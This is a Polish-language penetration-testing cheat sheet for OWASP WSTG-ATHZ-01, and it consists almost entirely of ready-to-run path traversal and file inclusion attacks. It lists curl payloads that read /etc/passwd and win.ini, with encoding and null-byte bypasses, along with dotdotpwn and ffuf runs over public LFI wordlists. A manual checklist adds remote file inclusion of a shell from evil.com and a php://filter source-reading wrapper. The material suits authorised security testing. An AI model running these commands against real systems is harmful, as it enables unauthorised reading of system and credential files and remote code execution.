# WSTG-ATHZ-01 — Testing Directory Traversal File Include

## Cele

- Identify injection points that pertain to path traversal
- Assess bypassing techniques and identify the extent of path traversal

## KOMENDY

### Podstawowe path traversal

```bash
curl -s "https://TARGET/file?path=../../../etc/passwd"
curl -s "https://TARGET/file?path=....//....//....//etc/passwd"
curl -s "https://TARGET/file?path=..%2f..%2f..%2fetc%2fpasswd"
curl -s "https://TARGET/file?path=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s "https://TARGET/file?path=..%252f..%252f..%252fetc%252fpasswd"
curl -s "https://TARGET/file?path=....\/....\/....\/etc/passwd"

```

### Null byte (starsze PHP)

```bash
curl -s "https://TARGET/file?path=../../../etc/passwd%00"
curl -s "https://TARGET/file?path=../../../etc/passwd%00.jpg"

```

### Windows paths

```bash
curl -s "https://TARGET/file?path=..\..\..\..\windows\win.ini"
curl -s "https://TARGET/file?path=..%5c..%5c..%5c..%5cwindows%5cwin.ini"

```

### dotdotpwn

```bash
dotdotpwn -m http -h TARGET -o unix -f /etc/passwd -k "root:" -d 8

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings Directory Traversal

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc all -o output_ffuf_traversal.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc all -o output_ffuf_deep_traversal.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc all -o output_ffuf_dotdotpwn.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc all -o output_ffuf_exotic.json

```

### PayloadsAllTheThings File Inclusion

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/JHADDIX_LFI.txt" -mc all -o output_ffuf_lfi_jhaddix.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Linux-files.txt" -mc all -o output_ffuf_lfi_linux.json

ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Windows-files.txt" -mc all -o output_ffuf_lfi_windows.json

```

### SecLists LFI

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -o output_ffuf_seclists_lfi.json

ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc all -o output_ffuf_seclists_lfi_linux.json

```

### fuzzdb path traversal

```bash
ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/path-traversal/traversals-8-deep-exotic-encoding.txt -mc all -o output_ffuf_fuzzdb_trav.json

ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/lfi/JHADDIX_LFI.txt -mc all -o output_ffuf_fuzzdb_lfi.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry ladujace pliki (path=, file=, page=, include=, doc=)
2. Testuj ../../../etc/passwd i warianty encodowania
3. Sprawdz RFI: file?path=http://evil.com/shell.php
4. Testuj PHP wrappers: php://filter/convert.base64-encode/resource=index.php
5. Testuj bypass filtrow: podwojne kodowanie, null byte, sciezki UNC
6. Sprawdz PayloadsAllTheThings File Inclusion/README.md dla wrapperow


---

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| off-by-slash | Wykrywanie alias traversal przez bledna konfiguracje NGINX | [GitHub](https://github.com/bayotop/off-by-slash) |
| 403Bypasser | Automatyczne techniki omijania restrykcji 403 | [GitHub](https://github.com/sting8k/BurpSuite_403Bypasser) |
